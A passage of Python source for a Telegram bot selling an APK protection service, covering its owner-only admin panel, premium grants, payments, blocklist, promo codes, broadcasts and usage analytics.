            return "👑OWNER"
        if i in admins:
            return "🛡ADMIN"
        u = USERS[uid]
        if u.get("plan_until", 0) > now:
            return "♾️PAID"
        if u.get("apks_left", 0) > 0:
            return "📦PAID"
        return "🆓FREE"
    for uid, u in sorted(USERS.items(), key=lambda kv: -kv[1].get("protected", 0)):
        cur = USERS[uid]
        name = (cur.get("name") or "—").replace("<", "&lt;").replace(">", "&gt;")[:20]
        lines.append(
            f"<code>{uid}</code> {_tag(uid)} — {name} · 🎁{cur.get('protected', 0)}"
        )
    return "\n".join(lines)


def _user_detail(user_id: str) -> str:
    if user_id not in USERS:
        return "❌ User not found."
    now = time.time()
    u = USERS[user_id]
    uid_int = int(user_id)
    name = (u.get("name") or "—").replace("<", "&lt;").replace(">", "&gt;")
    joined_ts = u.get("joined", 0)
    joined_str = datetime.fromtimestamp(joined_ts).strftime("%Y-%m-%d %H:%M") if joined_ts else "—"
    plan_until = u.get("plan_until", 0)
    if plan_until > now:
        plan_str = f"Active — {int((plan_until - now) // 86400)}d left"
    elif plan_until > 0:
        plan_str = f"Expired"
    else:
        plan_str = "No plan"
    apks_left = u.get("apks_left", 0)
    protected = u.get("protected", 0)
    bonus = u.get("bonus_free", 0)
    ref_code = u.get("ref", "—")
    ref_count = u.get("ref_count", 0)
    ref_points = u.get("ref_points", 0)
    history = db.get_history(int(user_id), limit=5)
    if uid_int in OWNER_IDS:
        role = "👑 OWNER"
    elif uid_int in ADMINS:
        role = "🛡 ADMIN"
    elif plan_until > now:
        role = "♾️ UNLIMITED"
    elif apks_left > 0:
        role = "📦 LIMITED"
    else:
        role = "🆓 FREE"
    lines = [
        f"👤 <b>USER INFO</b>",
        f"🆔 <b>ID:</b> <code>{user_id}</code>",
        f"📛 <b>Name:</b> {name}",
        f"🏷 <b>Role:</b> {role}",
        f"📅 <b>Joined:</b> {joined_str}",
        f"📦 <b>APKs protected:</b> <code>{protected}</code>",
        f"🎁 <b>Bonus free:</b> <code>{bonus}</code>",
        f"📦 <b>APKs left (limited):</b> <code>{apks_left}</code>",
        f"⏳ <b>Plan:</b> {plan_str}",
        f"🔗 <b>Referral code:</b> <code>{ref_code}</code>",
        f"👥 <b>Referrals:</b> <code>{ref_count}</code> • 🏆 <b>Points:</b> <code>{ref_points}</code>",
    ]
    if history:
        lines.append(f"━━━━━━━━━━━━━━━")
        lines.append(f"📜 <b>Recent activity:</b>")
        for h in history[-5:]:
            ts = datetime.fromtimestamp(h.get("ts", 0)).strftime("%m/%d %H:%M")
            hname = (h.get("name") or "—").replace("<", "&lt;").replace(">", "&gt;")[:15]
            lines.append(f"  • {ts} — {hname}")
    return "\n".join(lines)


async def btn_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    await q.edit_message_text(_admin_menu_text(), parse_mode="HTML", reply_markup=_admin_kb())


async def ap_toggle_free(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """🔓 Toggle FREE MODE on/off."""
    global FREE_MODE
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    FREE_MODE = not FREE_MODE
    _save_config()
    await q.answer(f"Free mode: {'ON ✅' if FREE_MODE else 'OFF ❌'}", show_alert=True)
    await q.edit_message_text(_admin_menu_text(), parse_mode="HTML", reply_markup=_admin_kb())


async def ap_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    await q.edit_message_text(_users_summary(), parse_mode="HTML", reply_markup=_admin_kb())


async def ap_userinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "userinfo"
    await q.edit_message_text(
        "👤 <b>User Info</b>\n\nSend me the <b>User ID</b>:",
        parse_mode="HTML",
        reply_markup=_back_only(),
    )


def _admins_summary() -> str:
    lines = ["🏦 <b>ADMINS</b>", ""]
    lines.append("<b>Owners (super-admins):</b>")
    for oid in OWNER_IDS:
        lines.append(f"  ✅ <code>{oid}</code>")
    if ADMINS:
        lines.append("")
        lines.append("<b>Admins:</b>")
        for aid in sorted(ADMINS):
            u = USERS.get(str(aid), {})
            name = (u.get("name") or "—").replace("<", "&lt;").replace(">", "&gt;")[:20]
            lines.append(f"  🛡 <code>{aid}</code> ({name})")
    else:
        lines.append("  ℹ️ No extra admins yet.")
    return "\n".join(lines)


def _admins_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add admin", callback_data="ap_addadmin"),
         InlineKeyboardButton("➖ Remove admin", callback_data="ap_rmadmin")],
        [InlineKeyboardButton("🔙 ← Admin panel", callback_data="back_admin")],
    ])


async def ap_admins(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    await q.edit_message_text(_admins_summary(), parse_mode="HTML", reply_markup=_admins_kb())


async def ap_addadmin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "addadmin"
    await q.edit_message_text("🏦 Send the <code>telegram_id</code> to grant admin access.",
                              parse_mode="HTML", reply_markup=_admins_kb())


async def ap_rmadmin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "rmadmin"
    await q.edit_message_text("🏦 Send the <code>telegram_id</code> to remove from admins.",
                              parse_mode="HTML", reply_markup=_admins_kb())


def _blist_summary() -> str:
    bl = sorted(_blocklist())
    if not bl:
        return "⛔ <b>Blacklist</b>\nNo users are blocked."
    lines = [f"⛔ <b>Blacklist</b> — {len(bl)} blocked"]
    for bid in bl:
        u = USERS.get(str(bid), {})
        nm = (u.get("name") or "—").replace("<", "&lt;").replace(">", "&gt;")[:20]
        lines.append(f"• <code>{bid}</code> ({nm})")
    return "\n".join(lines)


def _blist_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Block user", callback_data="ap_block"),
         InlineKeyboardButton("➖ Unblock user", callback_data="ap_unblock")],
        [InlineKeyboardButton("🔙 ← Admin panel", callback_data="back_admin")],
    ])


async def ap_blist(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    await q.edit_message_text(_blist_summary(), parse_mode="HTML", reply_markup=_blist_kb())


async def ap_block(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "block"
    await q.edit_message_text("⛔ Send the <code>telegram_id</code> to block.",
                              parse_mode="HTML", reply_markup=_blist_kb())


async def ap_unblock(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "unblock"
    await q.edit_message_text("➖ Send the <code>telegram_id</code> to unblock.",
                              parse_mode="HTML", reply_markup=_blist_kb())


def _promos_summary() -> str:
    promos = _promos()
    if not promos:
        return "🎫 <b>Promo codes</b>\nNo codes yet."
    lines = [f"🎫 <b>Promo codes</b> — {len(promos)}"]
    for code, p in promos.items():
        lines.append(f"• <code>{code}</code> → +{p.get('days', 1)}d · "
                     f"{p.get('used', 0)}/{p.get('max', 1)} used")
    return "\n".join(lines)


async def ap_promos(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    await q.edit_message_text(
        _promos_summary() + "\n\nUse <code>/makepromo CODE DAYS MAXUSES</code>",
        parse_mode="HTML", reply_markup=_admin_kb())


async def ap_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    try:
        free = shutil.disk_usage("/root")
        disk = free.free // (1024**3)
    except Exception:
        disk = 0
    paying = [u for u in USERS.values() if u.get("plan_until", 0) > time.time()]
    limited = [u for u in USERS.values() if u.get("apks_left", 0) > 0]
    await q.edit_message_text(
        f"🔧 <b>Server status</b>\n"
        f"🔓 free mode: <b>{'ON' if FREE_MODE else 'OFF'}</b>\n"
        f"• users: {len(USERS)}\n"
        f"• 🎁 total APKs built: {sum(u.get('protected', 0) for u in USERS.values())}\n"
        f"• ♾️ unlimited users: <b>{len(paying)}</b>\n"
        f"• 📦 limited users: <b>{len(limited)}</b>\n"
        f"• busy jobs: {len(_active)}\n"
        f"• disk free: {disk} GB",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_analytics(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    now = time.time()
    day = now - 86400
    week = now - 7 * 86400
    new_day = sum(1 for u in USERS.values() if u.get("joined", 0) >= day)
    new_week = sum(1 for u in USERS.values() if u.get("joined", 0) >= week)
    protected_day = db.count_protected_today(day)
    protected_week = db.count_protected_today(week)
    total_protected = db.total_protected()
    paying = sum(1 for u in USERS.values() if u.get("plan_until", 0) > now)
    referrals = sum(int(u.get("ref_count", 0) or 0) for u in USERS.values())
    top_users = sorted(
        USERS.items(), key=lambda item: item[1].get("protected", 0), reverse=True
    )[:5]
    top_lines = "\n".join(
        f"• <code>{uid}</code> — {int(user.get('protected', 0))} APK(s)"
        for uid, user in top_users
        if int(user.get("protected", 0)) > 0
    ) or "• No APK activity yet"
    await q.edit_message_text(
        "📊 <b>ANALYTICS</b>\n"
        "━━━━━━━━━━━━━━━\n"
        f"🔓 Free mode: <b>{'ON' if FREE_MODE else 'OFF'}</b>\n"
        f"👥 Total users: <b>{len(USERS)}</b>\n"
        f"➕ New users: <b>{new_day}</b> today · <b>{new_week}</b> week\n"
        f"📦 APKs protected: <b>{total_protected}</b> total · "
        f"<b>{protected_day}</b> today · <b>{protected_week}</b> week\n"
        f"♾️ Active premium: <b>{paying}</b>\n"
        f"🎁 Referral joins: <b>{referrals}</b>\n"
        "━━━━━━━━━━━━━━━\n"
        "<b>Top users by APK activity</b>\n"
        f"{top_lines}",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_forcejoin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    channels = "\n".join(
        f"• <b>{channel}</b> — {CHANNEL_URLS[i] if i < len(CHANNEL_URLS) else 'no link'}"
        for i, channel in enumerate(CHANNELS)
    ) or "• Disabled"
    await q.edit_message_text(
        "📢 <b>FORCE JOIN</b>\n"
        f"Status: <b>{'ON' if FORCE_JOIN else 'OFF'}</b>\n"
        f"Users must join the channel before using the bot.\n\n"
        f"{channels}",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_grant(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "grant"
    await q.edit_message_text(
        "🎖 <b>Grant premium</b>\nSend:\n"
        "<code>&lt;id&gt; unlimited &lt;days&gt;</code>\n"
        "<code>&lt;id&gt; limited &lt;apks&gt;</code>",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "revoke"
    await q.edit_message_text(
        "🚫 Send the <code>telegram_id</code> to revoke premium.",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_price(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "price"
    await q.edit_message_text(
        "💰 <b>Set pricing</b>\nSend two values:\n"
        "<code>&lt;7d price&gt; &lt;30d price&gt;</code>\n"
        f"(current: {PLAN_7D_COST} / {PLAN_30D_COST})",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_payee(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "payee"
    await q.edit_message_text(
        f"💳 <b>Set payee</b>\n(current: {_payee()})\n\nSend new one.",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_botname(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "botname"
    await q.edit_message_text(
        f"✏️ <b>Set bot name</b>\n(current: {_bot_name()})\n\nSend the new name.",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_welcome(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "welcome"
    await q.edit_message_text(
        "💬 <b>Edit welcome message</b>\nSend the new /start text.\n"
        "You can use <code>{first}</code> for the user's name.\n"
        "Send <code>RESET</code> to restore the default.",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "broadcast"
    await q.edit_message_text(
        "📢 <b>Broadcast</b>\nSend a photo/video/GIF/file with optional caption (or plain text).",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_dm(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    ADMIN_PENDING[update.effective_chat.id] = "dm_id"
    await q.edit_message_text(
        "📩 <b>Message one user</b>\nFirst send the <code>telegram_id</code>.",
        parse_mode="HTML", reply_markup=_admin_kb(),
    )


async def ap_kb_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    if not kb:
        await q.edit_message_text(
            "📚 <b>KB Status</b>\n\n❌ KB module not available.",
            parse_mode="HTML", reply_markup=_admin_kb(),
        )
        return
    stats = kb.get_stats()
    lines = [
        "📚 <b>KNOWLEDGE BASE STATUS</b>",
        "━━━━━━━━━━━━━━━",
    ]
    for cat_name, cat_key in [("🔐 Encryption", "encryption"), ("💀 Poison", "poison"), ("📦 Wrapper", "wrapper")]:
        cat_stats = stats["by_category"].get(cat_key, {"count": 0, "avg_score": 0})
        lines.append(f"{cat_name}: <b>{cat_stats['count']}</b> patterns (avg: <b>{cat_stats['avg_score']}</b>)")
    lines.extend([
        "━━━━━━━━━━━━━━━",
        f"📊 <b>Total:</b> <code>{stats['total']}</code>",
        "",
        "Use <code>/train</code> to add patterns",
    ])
    await q.edit_message_text("\n".join(lines), parse_mode="HTML", reply_markup=_admin_kb())


async def ap_train_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not _is_owner(update.effective_chat.id):
        await q.answer("Admins only")
        return
    await q.answer()
    uid = update.effective_chat.id
    TRAIN_SESSION[uid] = {"state": "waiting_apk"}
    await q.edit_message_text(
        "📚 <b>KB Training Mode</b>\nSend an APK file to analyze and extract patterns.\n\n"
        "Send <code>/cancel</code> to abort.",
        parse_mode="HTML",
    )


async def back_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    ADMIN_PENDING.pop(update.effective_chat.id, None)
    await q.edit_message_text(_admin_menu_text(), parse_mode="HTML",
                              reply_markup=_admin_kb())


async def back_main(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    ADMIN_PENDING.pop(update.effective_chat.id, None)
    uid = update.effective_chat.id
    await q.edit_message_text(
        await _welcome_text(update), parse_mode="HTML",
        reply_markup=_main_kb(_is_owner(uid)),
    )


async def admin_text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat.id
    if not _is_owner(chat):
        return
    pending = ADMIN_PENDING.pop(chat, None)
    if pending is None:
        return
    txt = (update.effective_message.text or "").strip()
    bot = ctx.bot
    global PLAN_7D_COST, PLAN_30D_COST
    try:
        if pending == "grant":
            parts = txt.split()
            if len(parts) != 3 or not parts[0].lstrip("-").isdigit():
                await _reply(update, "❌ Wrong format.")
                return
            target = str(int(parts[0]))
            plan_type = parts[1].lower()
            value = int(parts[2]) if parts[2].isdigit() else 0
            if plan_type == "unlimited":
                u = _user(int(target))
                u["plan_until"] = int(time.time()) + value * 86400
                db.save_all_users(USERS)
                until = datetime.utcfromtimestamp(u["plan_until"]).strftime("%Y-%m-%d %H:%M UTC")
                try:
                    await bot.send_message(chat_id=int(target),
                                           text=f"✅ <b>Activated!</b> Unlimited {value}d until {until}.",
                                           parse_mode="HTML")
                except Exception:
                    pass
                await _reply(update, f"✅ Granted unlimited {value}d to <code>{target}</code>.")
            elif plan_type == "limited":
                u = _user(int(target))
                u["apks_left"] = u.get("apks_left", 0) + value
                db.save_all_users(USERS)
                await _reply(update, f"✅ Granted {value} APK(s) to <code>{target}</code>.")
        elif pending == "revoke":
            if not txt.lstrip("-").isdigit():
                await _reply(update, "❌ Send a numeric telegram ID.")
                return
            target = str(int(txt))
            u = _user(int(target))
            u["plan_until"] = 0
            db.save_all_users(USERS)
            await _reply(update, f"✅ Revoked plan for <code>{target}</code>.")
        elif pending == "addadmin":
            if not txt.lstrip("-").isdigit():
                await _reply(update, "❌ Numeric ID required.")
                return
            ADMINS.add(int(txt)); _save_admins()
            await _reply(update, f"✅ <code>{int(txt)}</code> is now an admin.")
        elif pending == "rmadmin":
            if not txt.lstrip("-").isdigit():
                await _reply(update, "❌ Numeric ID required.")
                return
            ADMINS.discard(int(txt)); _save_admins()
            await _reply(update, f"✅ <code>{int(txt)}</code> removed from admins.")
        elif pending == "block":
            if not txt.lstrip("-").isdigit():
                await _reply(update, "❌ Numeric ID required.")
                return
            bl = _blocklist(); bl.add(int(txt)); _save_blocklist(bl)
            await _reply(update, f"⛔ Blocked <code>{int(txt)}</code>.")
        elif pending == "unblock":
            if not txt.lstrip("-").isdigit():
                await _reply(update, "❌ Numeric ID required.")
                return
            bl = _blocklist(); bl.discard(int(txt)); _save_blocklist(bl)
            await _reply(update, f"✅ Unblocked <code>{int(txt)}</code>.")
        elif pending == "userinfo":
            if not txt.lstrip("-").isdigit():
                await _reply(update, "❌ Numeric ID required.")
                return
            await _reply(update, _user_detail(str(int(txt))), parse_mode="HTML",
                         reply_markup=_admin_kb())
        elif pending == "price":
            parts = txt.split()
            if len(parts) != 2:
                await _reply(update, "❌ Send two values.")
                return
            CONFIG["plan7"], CONFIG["plan30"] = parts[0], parts[1]
            _save_config()
            PLAN_7D_COST, PLAN_30D_COST = parts[0], parts[1]
            await _reply(update, f"✅ Pricing set: {PLAN_7D_COST}/7d · {PLAN_30D_COST}/30d.")
        elif pending == "payee":
            CONFIG["payee"] = txt; _save_config()
            await _reply(update, f"✅ Payee set to <b>{_payee()}</b>.")
        elif pending == "botname":
            CONFIG["botname"] = txt; _save_config()
            try:
                await bot.set_my_name(name=txt)
            except Exception as e:
                logger.warning("set_my_name failed: %s", e)
            await _reply(update, f"✅ Bot name set to <b>{txt}</b>.")
        elif pending == "welcome":
            if txt.upper() == "RESET":
                CONFIG.pop("welcome", None); _save_config()
                await _reply(update, "✅ Welcome reset to default.")
            else:
                CONFIG["welcome"] = txt; _save_config()
                await _reply(update, "✅ Custom welcome saved.")
        elif pending == "broadcast":
            if not USERS:
                await _reply(update, "No users to broadcast to.")
                return
            ok = 0
            for uid in list(USERS):
                try:
                    await bot.send_message(chat_id=int(uid), text=txt, parse_mode="HTML")
                    ok += 1
                except Exception:
                    pass
            await _reply(update, f"📢 Broadcast sent to {ok}/{len(USERS)} users.")
        elif pending == "dm_id":
            if not txt.lstrip("-").isdigit():
                await _reply(update, "❌ Numeric ID required.")
                return
            ADMIN_PENDING[chat] = ("dm_msg", int(txt))
            await _reply(update, f"📩 Target <code>{int(txt)}</code>. Now send the message:")
        elif isinstance(pending, tuple) and pending[0] == "dm_msg":
            target = pending[1]
            try:
                await bot.send_message(chat_id=target, text=txt, parse_mode="HTML")
                await _reply(update, f"✅ Sent to <code>{target}</code>.")
            except Exception as e:
                await _reply(update, f"❌ Could not send: <code>{e}</code>")
    except Exception as e:
        logger.exception("admin input failed")
        await _reply(update, f"❌ Error:\n<code>{e}</code>")


async def admin_media_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat.id
    if not _is_owner(chat):
        return
    pending = ADMIN_PENDING.get(chat)
    if pending != "broadcast":
        return
    ADMIN_PENDING.pop(chat, None)
    if not USERS:
        await _reply(update, "No users to broadcast to.")
        return
    msg = update.effective_message
    caption = (msg.caption_html if msg.caption else "").strip().replace("\n", " ")
    bot = ctx.bot
    ok = 0
    def _send(u: int):
        if msg.photo:
            return bot.send_photo(chat_id=u, photo=msg.photo[-1].file_id,
                                  caption=caption or None, parse_mode="HTML")
        if msg.video:
            return bot.send_video(chat_id=u, video=msg.video.file_id,
                                  caption=caption or None, parse_mode="HTML")
        if msg.animation:
            return bot.send_animation(chat_id=u, animation=msg.animation.file_id,
                                      caption=caption or None, parse_mode="HTML")
        if msg.document:
            return bot.send_document(chat_id=u, document=msg.document.file_id,
                                     caption=caption or None, parse_mode="HTML")
        return bot.send_message(chat_id=u, text=caption or "📢", parse_mode="HTML")
    try:
        for uid in list(USERS):
            try:
                await _send(int(uid)); ok += 1
            except Exception:
                pass
    finally:
        await _reply(update, f"📢 Broadcast sent to {ok}/{len(USERS)} users.")


# ----------------------------- admin commands -----------------------------

def _admin_only(update: Update):
    return _is_owner(update.effective_chat.id)


async def grant_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    args = ctx.args
    if len(args) < 2 or not args[0].lstrip("-").isdigit():
        await _reply(update, "Usage:\n/grant <id> unlimited <days>\n/grant <id> limited <apks>")
        return
    target = str(int(args[0]))
    plan_type = args[1].lower()
    value = int(args[2]) if len(args) > 2 and args[2].isdigit() else 0
    if plan_type == "unlimited":
        u = _user(int(target))
        u["plan_until"] = int(time.time()) + value * 86400
        db.save_all_users(USERS)
        until = datetime.utcfromtimestamp(u["plan_until"]).strftime("%Y-%m-%d %H:%M UTC")
        await _reply(update, f"✅ Granted unlimited {value}d to <code>{target}</code> until {until}.")
    elif plan_type == "limited":
        u = _user(int(target))
        u["apks_left"] = u.get("apks_left", 0) + value
        db.save_all_users(USERS)
        await _reply(update, f"✅ Granted {value} APK(s) to <code>{target}</code>.")
    else:
        await _reply(update, "Specify <b>unlimited</b> or <b>limited</b>.")


async def revoke_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    args = ctx.args
    if len(args) < 1 or not args[0].lstrip("-").isdigit():
        await _reply(update, "Usage: /revoke <telegram_id>")
        return
    target = str(int(args[0]))
    u = _user(int(target))
    u["plan_until"] = 0
    db.save_all_users(USERS)
    await _reply(update, f"✅ Revoked plan for <code>{target}</code>.")


async def users_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    await _reply(update, _users_summary())


async def admin_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    await _reply(update, _admin_menu_text(), kb=_admin_kb())


async def freemode_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Shortcut to toggle free mode from command."""
    global FREE_MODE
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    arg = (ctx.args[0] if ctx.args else "").lower()
    if arg in ("on", "1", "true", "yes"):
        FREE_MODE = True
    elif arg in ("off", "0", "false", "no"):
        FREE_MODE = False
    else:
        FREE_MODE = not FREE_MODE
    _save_config()
    await _reply(update, f"🔓 <b>FREE MODE: {'ON ✅' if FREE_MODE else 'OFF ❌'}</b>")


async def makepromo_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    args = ctx.args
    if len(args) < 3 or not args[2].isdigit():
        await _reply(update, "Usage: /makepromo <CODE> <days> <max_uses>")
        return
    code = args[0].strip().upper()
    days, mx = int(args[1]), int(args[2])
    promos = _promos()
    promos[code] = {"days": days, "max": mx, "used": 0}
    _save_promos()
    await _reply(update, f"✅ Promo <code>{code}</code> created: +{days}d, {mx} uses.")


async def block_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    args = ctx.args
    if not args or not args[0].lstrip("-").isdigit():
        await _reply(update, "Usage: /block <telegram_id>")
        return
    bl = _blocklist(); bl.add(int(args[0])); _save_blocklist(bl)
    await _reply(update, f"⛔ Blocked <code>{int(args[0])}</code>.")


async def unblock_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    args = ctx.args
    if not args or not args[0].lstrip("-").isdigit():
        await _reply(update, "Usage: /unblock <telegram_id>")
        return
    bl = _blocklist(); bl.discard(int(args[0])); _save_blocklist(bl)
    await _reply(update, f"✅ Unblocked <code>{int(args[0])}</code>.")


async def payproof_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    args = ctx.args
    if not args or len(args) < 2:
        await _reply(update, "Usage: /payproof <amount> <plan>")
        return
    amount = args[0]
    plan = args[1].lower()
    if plan in ("7d", "7day", "7days"):
        plan_type, plan_value = "unlimited", 7
    elif plan in ("30d", "30day", "30days"):
        plan_type, plan_value = "unlimited", 30
    elif plan.isdigit():
        plan_type, plan_value = "limited", int(plan)
    else:
        await _reply(update, "Invalid plan.")
        return
    pid = db.add_payment(chat_id, amount, plan_type, plan_value)
    for oid in OWNER_IDS:
        try:
            await ctx.bot.send_message(
                chat_id=oid,
                text=f"💳 <b>New payment proof</b>\n👤 {chat_id}\n💰 {amount}\n📦 {plan_type}:{plan_value}\n🆔 <code>{pid}</code>",
                parse_mode="HTML")
        except Exception:
            pass
    await _reply(update, f"✅ Payment proof submitted (ID: <code>{pid}</code>).")


async def approve_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    args = ctx.args
    if not args or not args[0].isdigit():
        await _reply(update, "Usage: /approve <payment_id>")
        return
    pid = int(args[0])
    pending = db.get_pending_payments()
    payment = next((p for p in pending if p["id"] == pid), None)
    if not payment:
        await _reply(update, "❌ Payment not found.")
        return
    db.process_payment(pid, True, update.effective_chat.id)
    target = payment["chat_id"]
    plan_type = payment["plan_type"]
    plan_value = payment["plan_value"]
    u = _user(target)
    if plan_type == "unlimited":
        base = max(u.get("plan_until", 0), time.time())
        u["plan_until"] = int(base) + plan_value * 86400
        db.save_all_users(USERS)
        await _reply(update, f"✅ Approved unlimited {plan_value}d for <code>{target}</code>.")
    else:
        u["apks_left"] = u.get("apks_left", 0) + plan_value
        db.save_all_users(USERS)
        await _reply(update, f"✅ Approved {plan_value} APK(s) for <code>{target}</code>.")


async def reject_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    args = ctx.args
    if not args or not args[0].isdigit():
        await _reply(update, "Usage: /reject <payment_id>")
        return
    pid = int(args[0])
    db.process_payment(pid, False, update.effective_chat.id)
    await _reply(update, f"❌ Payment <code>{pid}</code> rejected.")


async def payments_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    stats = db.get_payment_stats()
    pending = db.get_pending_payments()
    lines = [
        "💳 <b>PAYMENTS</b>",
        f"📊 Total: <b>{stats['total']}</b> • ✅ Approved: <b>{stats['approved']}</b> • ⏳ Pending: <b>{stats['pending']}</b>",
    ]
    if pending:
        lines.append(f"\n<b>Pending:</b>")
        for p in pending[:10]:
            lines.append(f"• <code>{p['id']}</code> — {p['chat_id']} — {p['amount']}")
    await _reply(update, "\n".join(lines))


async def warn_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not _admin_only(update):
        await _reply(update, "⛔ Admins only.")
        return
    args = ctx.args
    if not args or not args[0].lstrip("-").isdigit():
